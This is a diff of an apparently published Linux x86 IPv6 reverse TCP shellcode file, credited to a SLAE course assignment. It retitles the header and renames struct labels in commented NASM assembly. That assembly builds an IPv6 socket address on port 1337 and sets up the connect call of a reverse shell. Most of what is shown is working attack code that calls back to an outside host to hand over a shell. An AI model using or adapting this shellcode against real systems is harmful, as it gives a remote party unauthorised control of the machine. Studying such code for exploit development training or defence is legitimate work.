@@ -1,5 +1,5 @@
 /*
-# Exploit Title: Linux x86 Dual Network Stack (IPv4) Reverse TCP Shellcode
+# Exploit Title: Linux x86 IPv6 Reverse TCP Shellcode (94 bytes/null free)
 # Date: 2018-08-26
 # Shellcode Author: Kevin Kirsche
 # Shellcode Repository: https://github.com/kkirsche/SLAE/tree/master/assignment_2-reverse_shell
@@ -40,20 +40,20 @@ Commented NASM:
     ; connect ipv6
     ;; cleanup
     cdq
-    ;; v6rhost struct
-    push dword edx    ; v6rhost.sin6_scope_id
+    ;; v6lhost struct
+    push dword edx    ; v6lhost.sin6_scope_id
     ;; the address fd15:4ba5:5a2b:1002:61b7:23a9:ad3d:5509
     push dword 0x09553dad
     push dword 0xa923b761
     push dword 0x02102b5a
     push dword 0xa54b15fd
-    push edx          ; v6rhost.sin6_flowinfo
-    push word 0x3905  ; v6rhost.sin6_port = htons(1337)
-    push word 0xa     ; v6rhost.sin6_family = 0xa (AF6_INET)
+    push edx          ; v6lhost.sin6_flowinfo
+    push word 0x3905  ; v6lhost.sin6_port = htons(1337)
+    push word 0xa     ; v6lhost.sin6_family = 0xa (AF6_INET)
     ;; arguments
     mov ecx, esp      ; move our struct pointer into ECX
-    push 0x1c         ; sizeof v6rhost
-    push ecx          ; pointer v6rhost
+    push 0x1c         ; sizeof v6lhost
+    push ecx          ; pointer v6lhost
     push esi          ; push sockfd onto the stack
     ;; function
     mov ecx, esp      ; pointer to args on the stack into ecx
